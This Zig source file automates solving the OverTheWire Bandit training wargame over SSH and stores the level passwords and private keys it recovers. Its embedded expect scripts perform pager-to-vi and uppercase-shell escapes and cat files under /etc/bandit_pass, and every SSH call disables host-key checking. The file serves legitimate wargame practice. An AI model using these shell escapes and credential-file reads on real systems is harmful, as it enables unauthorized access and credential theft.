const std = @import("std");
const builtin = @import("builtin");

const DEFAULT_HOST = "bandit.labs.overthewire.org";
const DEFAULT_PORT = "2220";

// =============================================================================
// Minimal TOML parser (tailored to bandit-levels.toml schema).
// Supports: top-level tables [name] and [[name]], string ("..."), literal
// strings (' ' and '''...''' multi-line), integer values, and inline integer
// arrays [a, b]. Comments after '#' are ignored.
// =============================================================================

const TomlError = error{
    UnexpectedChar,
    UnterminatedString,
    InvalidInteger,
    InvalidEscape,
    EndOfInput,
    InvalidHeader,
};

pub const Value = union(enum) {
    string: []const u8,
    integer: i64,
    array: []Value,
    table: *Table,
};

pub const Table = struct {
    entries: std.ArrayList(Entry),

    pub const Entry = struct {
        key: []const u8,
        value: Value,
    };

    pub fn init(allocator: std.mem.Allocator) Table {
        return .{ .entries = std.ArrayList(Entry){} };
        _ = allocator;
    }

    pub fn get(self: *const Table, key: []const u8) ?*const Value {
        for (self.entries.items) |*e| {
            if (std.mem.eql(u8, e.key, key)) return &e.value;
        }
        return null;
    }

    pub fn put(self: *Table, allocator: std.mem.Allocator, key: []const u8, value: Value) !void {
        for (self.entries.items) |*e| {
            if (std.mem.eql(u8, e.key, key)) {
                e.value = value;
                return;
            }
        }
        try self.entries.append(allocator, .{ .key = key, .value = value });
    }
};

pub const Document = struct {
    root: Table,
    arena: std.heap.ArenaAllocator,

    pub fn deinit(self: *Document) void {
        self.arena.deinit();
    }
};

const Parser = struct {
    src: []const u8,
    pos: usize,
    arena: std.mem.Allocator,

    fn peek(self: *const Parser) ?u8 {
        return if (self.pos < self.src.len) self.src[self.pos] else null;
    }

    fn peekAt(self: *const Parser, offset: usize) ?u8 {
        return if (self.pos + offset < self.src.len) self.src[self.pos + offset] else null;
    }

    fn advance(self: *Parser) ?u8 {
        if (self.pos >= self.src.len) return null;
        const c = self.src[self.pos];
        self.pos += 1;
        return c;
    }

    fn match(self: *Parser, c: u8) bool {
        if (self.peek() == c) {
            _ = self.advance();
            return true;
        }
        return false;
    }

    fn skipSpace(self: *Parser) void {
        while (self.peek()) |c| {
            if (c == ' ' or c == '\t') {
                _ = self.advance();
            } else break;
        }
    }

    fn skipToEol(self: *Parser) void {
        while (self.peek()) |c| : (_ = self.advance()) {
            if (c == '\n') break;
        }
    }

    fn skipBlanks(self: *Parser) void {
        while (self.peek()) |c| {
            switch (c) {
                ' ', '\t', '\n', '\r' => _ = self.advance(),
                '#' => self.skipToEol(),
                else => return,
            }
        }
    }

    fn parseKey(self: *Parser) ![]const u8 {
        self.skipSpace();
        const start = self.pos;
        while (self.peek()) |c| {
            const ok = (c >= 'a' and c <= 'z') or (c >= 'A' and c <= 'Z') or
                (c >= '0' and c <= '9') or c == '_' or c == '-' or c == '.';
            if (ok) {
                _ = self.advance();
            } else break;
        }
        if (self.pos == start) return TomlError.UnexpectedChar;
        return try self.arena.dupe(u8, self.src[start..self.pos]);
    }

    fn parseQuotedString(self: *Parser) ![]const u8 {
        if (!self.match('"')) return TomlError.UnexpectedChar;
        var buf: std.ArrayList(u8) = .{};
        while (self.peek()) |c| {
            if (c == '"') {
                _ = self.advance();
                return try buf.toOwnedSlice(self.arena);
            }
            if (c == '\\') {
                _ = self.advance();
                const esc = self.advance() orelse return TomlError.UnterminatedString;
                const out: u8 = switch (esc) {
                    'n' => '\n',
                    't' => '\t',
                    'r' => '\r',
                    '\\' => '\\',
                    '"' => '"',
                    '0' => 0,
                    else => return TomlError.InvalidEscape,
                };
                try buf.append(self.arena, out);
            } else {
                if (c == '\n') return TomlError.UnterminatedString;
                try buf.append(self.arena, c);
                _ = self.advance();
            }
        }
        return TomlError.UnterminatedString;
    }

    fn parseLiteralString(self: *Parser) ![]const u8 {
        if (!self.match('\'')) return TomlError.UnexpectedChar;
        // triple ''' ... ''' multi-line literal?
        if (self.peek() == '\'' and self.peekAt(1) == '\'') {
            _ = self.advance();
            _ = self.advance();
            // skip leading newline if present
            if (self.peek() == '\r') _ = self.advance();
            if (self.peek() == '\n') _ = self.advance();
            const start = self.pos;
            while (self.pos + 2 < self.src.len) {
                if (self.src[self.pos] == '\'' and self.src[self.pos + 1] == '\'' and self.src[self.pos + 2] == '\'') {
                    const slice = self.src[start..self.pos];
                    self.pos += 3;
                    return try self.arena.dupe(u8, slice);
                }
                self.pos += 1;
            }
            return TomlError.UnterminatedString;
        }
        // single-quoted literal (no escapes)
        const start = self.pos;
        while (self.peek()) |c| {
            if (c == '\'') {
                const slice = self.src[start..self.pos];
                _ = self.advance();
                return try self.arena.dupe(u8, slice);
            }
            if (c == '\n') return TomlError.UnterminatedString;
            _ = self.advance();
        }
        return TomlError.UnterminatedString;
    }

    fn parseInteger(self: *Parser) !i64 {
        const start = self.pos;
        if (self.peek() == '-' or self.peek() == '+') _ = self.advance();
        var any = false;
        while (self.peek()) |c| {
            if (c >= '0' and c <= '9') {
                _ = self.advance();
                any = true;
            } else break;
        }
        if (!any) return TomlError.InvalidInteger;
        return std.fmt.parseInt(i64, self.src[start..self.pos], 10) catch TomlError.InvalidInteger;
    }

    fn parseArray(self: *Parser) ![]Value {
        if (!self.match('[')) return TomlError.UnexpectedChar;
        var items: std.ArrayList(Value) = .{};
        self.skipBlanks();
        while (self.peek()) |c| {
            if (c == ']') {
                _ = self.advance();
                return try items.toOwnedSlice(self.arena);
            }
            const v = try self.parseValue();
            try items.append(self.arena, v);
            self.skipSpace();
            if (self.peek() == ',') {
                _ = self.advance();
                self.skipBlanks();
                continue;
            }
            self.skipBlanks();
            if (self.peek() == ']') {
                _ = self.advance();
                return try items.toOwnedSlice(self.arena);
            }
        }
        return TomlError.UnterminatedString;
    }

    fn parseValue(self: *Parser) !Value {
        self.skipSpace();
        const c = self.peek() orelse return TomlError.EndOfInput;
        if (c == '"') return Value{ .string = try self.parseQuotedString() };
        if (c == '\'') return Value{ .string = try self.parseLiteralString() };
        if (c == '[') return Value{ .array = try self.parseArray() };
        if (c == '-' or c == '+' or (c >= '0' and c <= '9')) return Value{ .integer = try self.parseInteger() };
        return TomlError.UnexpectedChar;
    }

    fn parseHeader(self: *Parser) !struct { name: []const u8, is_array: bool } {
        if (!self.match('[')) return TomlError.InvalidHeader;
        const is_array = self.match('[');
        self.skipSpace();
        const start = self.pos;
        while (self.peek()) |c| {
            if (c == ']' or c == ' ' or c == '\t') break;
            _ = self.advance();
        }
        const name = self.src[start..self.pos];
        self.skipSpace();
        if (!self.match(']')) return TomlError.InvalidHeader;
        if (is_array and !self.match(']')) return TomlError.InvalidHeader;
        return .{ .name = try self.arena.dupe(u8, name), .is_array = is_array };
    }
};

pub fn parseToml(allocator: std.mem.Allocator, text: []const u8) !Document {
    var arena = std.heap.ArenaAllocator.init(allocator);
    errdefer arena.deinit();
    const a = arena.allocator();

    var root = Table.init(a);
    var parser = Parser{ .src = text, .pos = 0, .arena = a };

    var current: *Table = &root;

    while (true) {
        parser.skipBlanks();
        if (parser.peek() == null) break;

        if (parser.peek() == '[') {
            const hdr = try parser.parseHeader();
            // Only top-level names (no dotted keys in bandit-levels.toml)
            if (hdr.is_array) {
                // Append a new table to the array at root[name].
                const new_table = try a.create(Table);
                new_table.* = Table.init(a);
                if (root.get(hdr.name)) |existing| {
                    if (existing.* != .array) return TomlError.InvalidHeader;
                    var items = std.ArrayList(Value){};
                    try items.appendSlice(a, existing.array);
                    try items.append(a, Value{ .table = new_table });
                    try root.put(a, hdr.name, Value{ .array = try items.toOwnedSlice(a) });
                } else {
                    var slice = try a.alloc(Value, 1);
                    slice[0] = Value{ .table = new_table };
                    try root.put(a, hdr.name, Value{ .array = slice });
                }
                current = new_table;
            } else {
                const new_table = try a.create(Table);
                new_table.* = Table.init(a);
                try root.put(a, hdr.name, Value{ .table = new_table });
                current = new_table;
            }
            continue;
        }

        // key = value line
        const key = try parser.parseKey();
        parser.skipSpace();
        if (!parser.match('=')) return TomlError.UnexpectedChar;
        const value = try parser.parseValue();
        try current.put(a, key, value);
    }

    return Document{ .root = root, .arena = arena };
}

// =============================================================================
// App state + helpers
// =============================================================================

const App = struct {
    allocator: std.mem.Allocator,
    host: []const u8 = "",
    port: []const u8 = "",
    repo_root: []const u8 = "",
    config_path: []const u8 = "",
    pass_file: []const u8 = "",
    key_dir: []const u8 = "",
    rng: std.Random.DefaultPrng,

    fn ensureState(self: *App) !void {
        try std.fs.cwd().makePath(self.key_dir);
        std.posix.chmod(self.key_dir, 0o700) catch {};
        const f = std.fs.cwd().createFile(self.pass_file, .{ .truncate = false }) catch |err| switch (err) {
            error.PathAlreadyExists => null,
            else => return err,
        };
        if (f) |opened| {
            var open = opened;
            open.close();
        }
        std.posix.chmod(self.pass_file, 0o600) catch {};
    }
};

fn envOr(name: []const u8, fallback: []const u8) []const u8 {
    if (std.posix.getenv(name)) |v| {
        if (v.len > 0) return v;
    }
    return fallback;
}

fn findRepoRoot(allocator: std.mem.Allocator) ![]const u8 {
    var cwd_buf: [std.fs.max_path_bytes]u8 = undefined;
    var cwd = try std.process.getCwd(&cwd_buf);
    while (true) {
        const probe = try std.fs.path.join(allocator, &.{ cwd, "levels", "bandit-levels.toml" });
        defer allocator.free(probe);
        if (std.fs.cwd().access(probe, .{})) |_| {
            return try allocator.dupe(u8, cwd);
        } else |_| {}
        const parent = std.fs.path.dirname(cwd) orelse return error.RepoRootNotFound;
        if (std.mem.eql(u8, parent, cwd)) return error.RepoRootNotFound;
        cwd = parent;
    }
}

fn die(msg: []const u8) noreturn {
    const w = std.fs.File.stderr().writer(&.{}).interface;
    w.print("error: {s}\n", .{msg}) catch {};
    std.process.exit(1);
}

// =============================================================================
// ANSI strip (state machine) + password extraction (manual matcher)
// =============================================================================

pub fn stripTerminalCodes(allocator: std.mem.Allocator, src: []const u8) ![]u8 {
    var out: std.ArrayList(u8) = .{};
    var i: usize = 0;
    while (i < src.len) {
        const c = src[i];
        if (c == '\r') {
            i += 1;
            continue;
        }
        if (c != 0x1B) {
            try out.append(allocator, c);
            i += 1;
            continue;
        }
        i += 1;
        if (i >= src.len) break;
        const next = src[i];
        if (next == '[') {
            i += 1;
            while (i < src.len) : (i += 1) {
                const ch = src[i];
                if (ch >= 0x40 and ch <= 0x7E) {
                    i += 1;
                    break;
                }
            }
        } else if (next == ']') {
            i += 1;
            while (i < src.len) : (i += 1) {
                const ch = src[i];
                if (ch == 0x07) {
                    i += 1;
                    break;
                }
                if (ch == 0x1B and i + 1 < src.len and src[i + 1] == '\\') {
                    i += 2;
                    break;
                }
            }
        } else if (next == 'P') {
            i += 1;
            while (i < src.len) : (i += 1) {
                if (src[i] == 0x1B and i + 1 < src.len and src[i + 1] == '\\') {
                    i += 2;
                    break;
                }
            }
        } else {
            i += 1; // skip single-byte escape
        }
    }
    return try out.toOwnedSlice(allocator);
}

fn isAlnum(c: u8) bool {
    return (c >= 'a' and c <= 'z') or (c >= 'A' and c <= 'Z') or (c >= '0' and c <= '9');
}

pub fn extractPasswords(allocator: std.mem.Allocator, src: []const u8) ![][]const u8 {
    const clean = try stripTerminalCodes(allocator, src);
    defer allocator.free(clean);
    var matches: std.ArrayList([]const u8) = .{};
    var i: usize = 0;
    while (i + 32 <= clean.len) {
        var all = true;
        var j: usize = 0;
        while (j < 32) : (j += 1) {
            if (!isAlnum(clean[i + j])) {
                all = false;
                break;
            }
        }
        if (all) {
            const copy = try allocator.dupe(u8, clean[i .. i + 32]);
            try matches.append(allocator, copy);
            i += 32;
        } else {
            i += j + 1;
        }
    }
    return try matches.toOwnedSlice(allocator);
}

fn freePasswords(allocator: std.mem.Allocator, pws: [][]const u8) void {
    for (pws) |p| allocator.free(p);
    allocator.free(pws);
}

pub fn extractPasswordOrErr(allocator: std.mem.Allocator, src: []const u8) ![]const u8 {
    const pws = try extractPasswords(allocator, src);
    defer freePasswords(allocator, pws);
    if (pws.len == 0) return error.NoPasswordFound;
    return try allocator.dupe(u8, pws[pws.len - 1]);
}

fn isFullPassword(s: []const u8) bool {
    if (s.len != 32) return false;
    for (s) |c| {
        if (!isAlnum(c)) return false;
    }
    return true;
}

pub fn renderTemplate(allocator: std.mem.Allocator, template: []const u8, vars: []const struct { key: []const u8, value: []const u8 }) ![]u8 {
    var current = try allocator.dupe(u8, template);
    for (vars) |kv| {
        const placeholder = try std.fmt.allocPrint(allocator, "{{{s}}}", .{kv.key});
        defer allocator.free(placeholder);
        const replaced = try replaceAll(allocator, current, placeholder, kv.value);
        allocator.free(current);
        current = replaced;
    }
    return current;
}

fn replaceAll(allocator: std.mem.Allocator, source: []const u8, needle: []const u8, replacement: []const u8) ![]u8 {
    if (needle.len == 0) return try allocator.dupe(u8, source);
    var out: std.ArrayList(u8) = .{};
    var i: usize = 0;
    while (i < source.len) {
        if (i + needle.len <= source.len and std.mem.eql(u8, source[i .. i + needle.len], needle)) {
            try out.appendSlice(allocator, replacement);
            i += needle.len;
        } else {
            try out.append(allocator, source[i]);
            i += 1;
        }
    }
    return try out.toOwnedSlice(allocator);
}

// =============================================================================
// Subprocess wrapper
// =============================================================================

const ProcResult = struct {
    exit_code: u32,
    output: []u8, // owned by allocator
};

fn runCommand(
    allocator: std.mem.Allocator,
    argv: []const []const u8,
    extra_env: ?std.process.EnvMap,
    stdin_input: ?[]const u8,
) !ProcResult {
    var child = std.process.Child.init(argv, allocator);
    child.stdin_behavior = if (stdin_input != null) .Pipe else .Ignore;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    if (extra_env) |env| child.env_map = &env;
    try child.spawn();

    if (stdin_input) |text| {
        if (child.stdin) |*stdin| {
            try stdin.writeAll(text);
            stdin.close();
            child.stdin = null;
        }
    }

    var out_buf: std.ArrayList(u8) = .{};
    defer out_buf.deinit(allocator);
    var err_buf: std.ArrayList(u8) = .{};
    defer err_buf.deinit(allocator);

    try child.collectOutput(allocator, &out_buf, &err_buf, 16 * 1024 * 1024);
    const term = try child.wait();

    var combined: std.ArrayList(u8) = .{};
    try combined.appendSlice(allocator, out_buf.items);
    try combined.appendSlice(allocator, err_buf.items);

    const code: u32 = switch (term) {
        .Exited => |c| c,
        else => 1,
    };
    return ProcResult{ .exit_code = code, .output = try combined.toOwnedSlice(allocator) };
}

fn buildEnv(allocator: std.mem.Allocator, kvs: []const struct { key: []const u8, value: []const u8 }) !std.process.EnvMap {
    var env = try std.process.getEnvMap(allocator);
    errdefer env.deinit();
    for (kvs) |kv| try env.put(kv.key, kv.value);
    return env;
}

fn runExpectOrErr(allocator: std.mem.Allocator, script: []const u8, env_kvs: []const struct { key: []const u8, value: []const u8 }) ![]u8 {
    var env = try buildEnv(allocator, env_kvs);
    defer env.deinit();
    const r = try runCommand(allocator, &.{"expect"}, env, script);
    if (r.exit_code != 0) {
        defer allocator.free(r.output);
        return error.ExpectFailed;
    }
    return r.output;
}

fn checkDependencies(allocator: std.mem.Allocator) !void {
    const deps = [_][]const u8{ "expect", "ssh", "git", "awk", "grep", "mktemp" };
    for (deps) |cmd| {
        if (try whichIn(allocator, cmd) == null) {
            const msg = try std.fmt.allocPrint(allocator, "missing required command: {s}", .{cmd});
            die(msg);
        }
    }
}

fn whichIn(allocator: std.mem.Allocator, cmd: []const u8) !?[]u8 {
    const path = std.posix.getenv("PATH") orelse return null;
    var it = std.mem.tokenizeScalar(u8, path, ':');
    while (it.next()) |dir| {
        const candidate = try std.fs.path.join(allocator, &.{ dir, cmd });
        if (std.fs.cwd().access(candidate, .{})) |_| {
            const st = std.fs.cwd().statFile(candidate) catch {
                allocator.free(candidate);
                continue;
            };
            _ = st;
            return candidate;
        } else |_| {}
        allocator.free(candidate);
    }
    return null;
}

// =============================================================================
// Expect scripts
// =============================================================================

const SCRIPT_PASSWORD_SSH =
    \\set timeout 180
    \\spawn -noecho ssh \
    \\  -o StrictHostKeyChecking=no \
    \\  -o UserKnownHostsFile=/dev/null \
    \\  -o LogLevel=ERROR \
    \\  -o PubkeyAuthentication=no \
    \\  -o PreferredAuthentications=password \
    \\  -o NumberOfPasswordPrompts=1 \
    \\  -p $env(BANDIT_PORT_VALUE) \
    \\  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE) \
    \\  $env(BANDIT_COMMAND_VALUE)
    \\expect {
    \\  "*password:" {
    \\    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    \\    exp_continue
    \\  }
    \\  timeout {
    \\    exit 124
    \\  }
    \\  eof {
    \\  }
    \\}
    \\catch wait result
    \\exit [lindex $result 3]
    \\
;

const SCRIPT_BANDIT26 =
    \\set timeout 90
    \\set stty_init "rows 5 columns 80"
    \\spawn -noecho ssh \
    \\  -tt \
    \\  -o StrictHostKeyChecking=no \
    \\  -o UserKnownHostsFile=/dev/null \
    \\  -o LogLevel=ERROR \
    \\  -o IdentitiesOnly=yes \
    \\  -i $env(BANDIT_KEY_VALUE) \
    \\  -p $env(BANDIT_PORT_VALUE) \
    \\  bandit26@$env(BANDIT_HOST_VALUE)
    \\expect {
    \\  -re "--More--" {
    \\    send -- "v"
    \\  }
    \\  timeout {
    \\    exit 124
    \\  }
    \\  eof {
    \\    exit 1
    \\  }
    \\}
    \\expect {
    \\  -re "~" {
    \\  }
    \\  timeout {
    \\    exit 124
    \\  }
    \\  eof {
    \\    exit 1
    \\  }
    \\}
    \\after 500
    \\send -- "\033:set shell=/bin/bash\r"
    \\after 500
    \\send -- ":shell\r"
    \\after 500
    \\send -- "cat /etc/bandit_pass/bandit26; ./bandit27-do cat /etc/bandit_pass/bandit27; exit\r"
    \\set password_count 0
    \\expect {
    \\  -re {[[:alnum:]]{32}} {
    \\    incr password_count
    \\    if {$password_count < 2} {
    \\      exp_continue
    \\    }
    \\  }
    \\  timeout {
    \\    exit 124
    \\  }
    \\  eof {
    \\    exit 1
    \\  }
    \\}
    \\close
    \\wait
    \\exit 0
    \\
;

const SCRIPT_UPPERCASE =
    \\set timeout 60
    \\spawn -noecho ssh \
    \\  -tt \
    \\  -o StrictHostKeyChecking=no \
    \\  -o UserKnownHostsFile=/dev/null \
    \\  -o LogLevel=ERROR \
    \\  -o PubkeyAuthentication=no \
    \\  -o PreferredAuthentications=password \
    \\  -o NumberOfPasswordPrompts=1 \
    \\  -p $env(BANDIT_PORT_VALUE) \
    \\  bandit32@$env(BANDIT_HOST_VALUE)
    \\expect {
    \\  "*password:" {
    \\    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    \\    exp_continue
    \\  }
    \\  -re "WELCOME TO THE UPPERCASE SHELL|>>" {
    \\  }
    \\  timeout {
    \\    exit 124
    \\  }
    \\}
    \\after 500
    \\send -- "\$0\r"
    \\expect {
    \\  -re {[$#] } {
    \\  }
    \\  timeout {
    \\    exit 124
    \\  }
    \\}
    \\send -- "cat /etc/bandit_pass/bandit33; exit\r"
    \\expect {
    \\  -re {[[:alnum:]]{32}} {
    \\  }
    \\  timeout {
    \\    exit 124
    \\  }
    \\}
    \\close
    \\wait
    \\exit 0
    \\
;

const SCRIPT_INTERACTIVE =
    \\set timeout 30
    \\spawn ssh \
    \\  -o StrictHostKeyChecking=no \
    \\  -o UserKnownHostsFile=/dev/null \
    \\  -o LogLevel=ERROR \
    \\  -o PubkeyAuthentication=no \
    \\  -o PreferredAuthentications=password \
    \\  -p $env(BANDIT_PORT_VALUE) \
    \\  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE)
    \\expect {
    \\  "*password:" {
    \\    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    \\    interact
    \\  }
    \\  timeout {
    \\    interact
    \\  }
    \\  eof {
    \\  }
    \\}
    \\
;

// =============================================================================
// Password storage + record
// =============================================================================

fn savePassword(app: *App, user: []const u8, password: []const u8) !void {
    try app.ensureState();
    const existing = std.fs.cwd().readFileAlloc(app.allocator, app.pass_file, 1 << 20) catch |err| switch (err) {
        error.FileNotFound => try app.allocator.dupe(u8, ""),
        else => return err,
    };
    defer app.allocator.free(existing);

    var out: std.ArrayList(u8) = .{};
    defer out.deinit(app.allocator);
    var it = std.mem.splitScalar(u8, existing, '\n');
    const prefix = try std.fmt.allocPrint(app.allocator, "{s}:", .{user});
    defer app.allocator.free(prefix);
    while (it.next()) |line| {
        if (line.len == 0) continue;
        if (std.mem.startsWith(u8, line, prefix)) continue;
        try out.appendSlice(app.allocator, line);
        try out.append(app.allocator, '\n');
    }
    try out.appendSlice(app.allocator, user);
    try out.appendSlice(app.allocator, ": ");
    try out.appendSlice(app.allocator, password);
    try out.append(app.allocator, '\n');

    var file = try std.fs.cwd().createFile(app.pass_file, .{});
    defer file.close();
    try file.writeAll(out.items);
    std.posix.chmod(app.pass_file, 0o600) catch {};
}

fn getSavedPassword(app: *App, user: []const u8) ![]u8 {
    const existing = std.fs.cwd().readFileAlloc(app.allocator, app.pass_file, 1 << 20) catch |err| switch (err) {
        error.FileNotFound => return try app.allocator.dupe(u8, ""),
        else => return err,
    };
    defer app.allocator.free(existing);
    const prefix = try std.fmt.allocPrint(app.allocator, "{s}: ", .{user});
    defer app.allocator.free(prefix);
    var result: []u8 = try app.allocator.dupe(u8, "");
    var it = std.mem.splitScalar(u8, existing, '\n');
    while (it.next()) |line| {
        if (std.mem.startsWith(u8, line, prefix)) {
            app.allocator.free(result);
            result = try app.allocator.dupe(u8, line[prefix.len..]);
        }
    }
    return result;
}

fn recordPassword(app: *App, level: i64, password: []const u8) !void {
    const user = try std.fmt.allocPrint(app.allocator, "bandit{d}", .{level});
    defer app.allocator.free(user);
    if (level != 0 and !isFullPassword(password)) {
        const msg = try std.fmt.allocPrint(app.allocator, "refusing to save invalid password for {s}: {s}", .{ user, password });
        die(msg);
    }
    try savePassword(app, user, password);
    var stdout_buf: [256]u8 = undefined;
    var stdout_writer = std.fs.File.stdout().writer(&stdout_buf);
    const w = &stdout_writer.interface;
    try w.print("[+] {s:<8} {s}\n", .{ user, password });
    try w.flush();
}

// =============================================================================
// Step solving
// =============================================================================

const required_fields = struct {
    fn lookup(step_type: []const u8) ?[]const []const u8 {
        const ssh = [_][]const u8{ "from", "to", "command" };
        const pthc = [_][]const u8{ "from", "to", "find_command", "command" };
        const pk = [_][]const u8{ "from", "to", "key_command", "key_name", "next_user", "next_command" };
        const b26 = [_][]const u8{ "from", "to", "key_command", "key_name" };
        const grf = [_][]const u8{ "from", "to", "git_user", "repo", "file" };
        const gs = [_][]const u8{ "from", "to", "git_user", "repo", "object" };
        const gpf = [_][]const u8{ "from", "to", "git_user", "repo", "file", "content", "commit_message" };
        const us = [_][]const u8{ "from", "to" };
        if (std.mem.eql(u8, step_type, "ssh_command")) return &ssh;
        if (std.mem.eql(u8, step_type, "path_then_command")) return &pthc;
        if (std.mem.eql(u8, step_type, "private_key_then_ssh")) return &pk;
        if (std.mem.eql(u8, step_type, "bandit26_escape")) return &b26;
        if (std.mem.eql(u8, step_type, "git_read_file")) return &grf;
        if (std.mem.eql(u8, step_type, "git_show")) return &gs;
        if (std.mem.eql(u8, step_type, "git_push_file")) return &gpf;
        if (std.mem.eql(u8, step_type, "uppercase_shell")) return &us;
        return null;
    }
}.lookup;

fn validateConfig(root: *const Table) !void {
    const boot = root.get("bootstrap") orelse return error.MissingBootstrap;
    if (boot.* != .table) return error.MissingBootstrap;
    if (boot.table.get("level") == null) return error.MissingBootstrapLevel;
    const pass = boot.table.get("password") orelse return error.EmptyBootstrapPassword;
    if (pass.* != .string or pass.string.len == 0) return error.EmptyBootstrapPassword;

    const steps_v = root.get("steps") orelse return error.NoSteps;
    if (steps_v.* != .array or steps_v.array.len == 0) return error.NoSteps;
    for (steps_v.array, 0..) |item, idx| {
        if (item != .table) return error.StepNotTable;
        const t = item.table;
        const type_v = t.get("type") orelse return error.MissingStepType;
        if (type_v.* != .string) return error.MissingStepType;
        const fields = required_fields(type_v.string) orelse {
            std.debug.print("step {d}: unsupported type \"{s}\"\n", .{ idx + 1, type_v.string });
            return error.UnsupportedStepType;
        };
        for (fields) |f| {
            if (t.get(f) == null) {
                std.debug.print("step {d} ({s}) is missing {s}\n", .{ idx + 1, type_v.string, f });
                return error.StepMissingField;
            }
        }
    }
}

fn stepIntList(allocator: std.mem.Allocator, step: *const Table) ![]i64 {
    const v = step.get("to") orelse return error.MissingTo;
    switch (v.*) {
        .integer => |i| {
            const slice = try allocator.alloc(i64, 1);
            slice[0] = i;
            return slice;
        },
        .array => |arr| {
            var slice = try allocator.alloc(i64, arr.len);
            for (arr, 0..) |elem, i| {
                if (elem != .integer) return error.NonIntInToArray;
                slice[i] = elem.integer;
            }
            return slice;
        },
        else => return error.UnsupportedToType,
    }
}

fn stepIntSingle(step: *const Table) !i64 {
    var buf: [4]i64 = undefined;
    var fbA = std.heap.FixedBufferAllocator.init(std.mem.sliceAsBytes(buf[0..]));
    const list = try stepIntList(fbA.allocator(), step);
    if (list.len != 1) return error.ExpectedSingleTarget;
    return list[0];
}

fn stepMustString(step: *const Table, key: []const u8) ![]const u8 {
    const v = step.get(key) orelse return error.MissingStringField;
    if (v.* != .string) return error.MissingStringField;
    return v.string;
}

fn stepFieldString(step: *const Table, key: []const u8, fallback: []const u8) []const u8 {
    if (step.get(key)) |v| {
        if (v.* == .string) return v.string;
    }
    return fallback;
}

fn stepMustInt(step: *const Table, key: []const u8) !i64 {
    const v = step.get(key) orelse return error.MissingIntField;
    if (v.* != .integer) return error.MissingIntField;
    return v.integer;
}

fn putPassword(map: *std.AutoHashMap(i64, []const u8), allocator: std.mem.Allocator, level: i64, password: []const u8) !void {
    const dup = try allocator.dupe(u8, password);
    if (map.get(level)) |old| allocator.free(old);
    try map.put(level, dup);
}

fn passwordMapDeinit(map: *std.AutoHashMap(i64, []const u8), allocator: std.mem.Allocator) void {
    var it = map.iterator();
    while (it.next()) |entry| allocator.free(entry.value_ptr.*);
    map.deinit();
}

fn stepContextVars(allocator: std.mem.Allocator, app: *App, level: i64, password: []const u8, to_level: i64) ![]const struct { key: []const u8, value: []const u8 } {
    const port = 20000 + app.rng.random().intRangeAtMost(u32, 0, 9999);
    const suffix = 1000 + app.rng.random().intRangeAtMost(u32, 0, 8999);
    var arr: std.ArrayList(struct { key: []const u8, value: []const u8 }) = .{};
    try arr.append(allocator, .{ .key = "password", .value = try allocator.dupe(u8, password) });
    try arr.append(allocator, .{ .key = "level", .value = try std.fmt.allocPrint(allocator, "{d}", .{level}) });
    try arr.append(allocator, .{ .key = "to", .value = try std.fmt.allocPrint(allocator, "{d}", .{to_level}) });
    try arr.append(allocator, .{ .key = "random_port", .value = try std.fmt.allocPrint(allocator, "{d}", .{port}) });
    try arr.append(allocator, .{ .key = "temp_output", .value = try std.fmt.allocPrint(allocator, "/tmp/bandit{d}pass.{d}.{d}", .{ to_level, std.os.linux.getpid(), suffix }) });
    return try arr.toOwnedSlice(allocator);
}

fn freeCtxVars(allocator: std.mem.Allocator, vars: []const struct { key: []const u8, value: []const u8 }) void {
    for (vars) |kv| allocator.free(kv.value);
    allocator.free(vars);
}

fn runPasswordSshCommand(app: *App, user: []const u8, password: []const u8, command_text: []const u8) ![]u8 {
    const allocator = app.allocator;
    const kvs = [_]struct { key: []const u8, value: []const u8 }{
        .{ .key = "BANDIT_HOST_VALUE", .value = app.host },
        .{ .key = "BANDIT_PORT_VALUE", .value = app.port },
        .{ .key = "BANDIT_USER_VALUE", .value = user },
        .{ .key = "BANDIT_PASSWORD_VALUE", .value = password },
        .{ .key = "BANDIT_COMMAND_VALUE", .value = command_text },
    };
    return try runExpectOrErr(allocator, SCRIPT_PASSWORD_SSH, &kvs);
}

fn runKeySshCommand(app: *App, user: []const u8, key_file: []const u8, command_text: []const u8) ![]u8 {
    const allocator = app.allocator;
    const target = try std.fmt.allocPrint(allocator, "{s}@{s}", .{ user, app.host });
    defer allocator.free(target);
    const argv = [_][]const u8{
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "LogLevel=ERROR",
        "-o", "IdentitiesOnly=yes",
        "-o", "BatchMode=yes",
        "-i", key_file,
        "-p", app.port,
        target,
        command_text,
    };
    const r = try runCommand(allocator, &argv, null, null);
    if (r.exit_code != 0) {
        defer allocator.free(r.output);
        return error.SshFailed;
    }
    return r.output;
}

fn solvePassword(app: *App, user: []const u8, password: []const u8, command_text: []const u8) ![]u8 {
    const out = try runPasswordSshCommand(app, user, password, command_text);
    defer app.allocator.free(out);
    return try extractPasswordOrErr(app.allocator, out);
}

fn solvePath(app: *App, user: []const u8, password: []const u8, command_text: []const u8) ![]u8 {
    const allocator = app.allocator;
    const raw = try runPasswordSshCommand(app, user, password, command_text);
    defer allocator.free(raw);
    const clean = try stripTerminalCodes(allocator, raw);
    defer allocator.free(clean);
    var it = std.mem.splitScalar(u8, clean, '\n');
    var found: ?[]const u8 = null;
    while (it.next()) |line| {
        if (std.mem.indexOf(u8, line, "/inhere/") != null) found = line;
    }
    if (found) |line| return try allocator.dupe(u8, line);
    return error.PathNotFound;
}

fn savePrivateKey(app: *App, name: []const u8, output: []const u8) ![]const u8 {
    const allocator = app.allocator;
    const clean = try stripTerminalCodes(allocator, output);
    defer allocator.free(clean);
    const begin = std.mem.indexOf(u8, clean, "-----BEGIN ") orelse return error.PrivateKeyNotFound;
    const end_marker = std.mem.indexOf(u8, clean[begin..], "-----END ") orelse return error.PrivateKeyNotFound;
    const tail = std.mem.indexOf(u8, clean[begin + end_marker ..], "PRIVATE KEY-----") orelse return error.PrivateKeyNotFound;
    const stop = begin + end_marker + tail + "PRIVATE KEY-----".len;
    const blob = clean[begin..stop];
    try app.ensureState();
    const key_file = try std.fs.path.join(allocator, &.{ app.key_dir, name });
    var file = try std.fs.cwd().createFile(key_file, .{});
    defer file.close();
    try file.writeAll(blob);
    try file.writeAll("\n");
    std.posix.chmod(key_file, 0o600) catch {};
    return key_file;
}

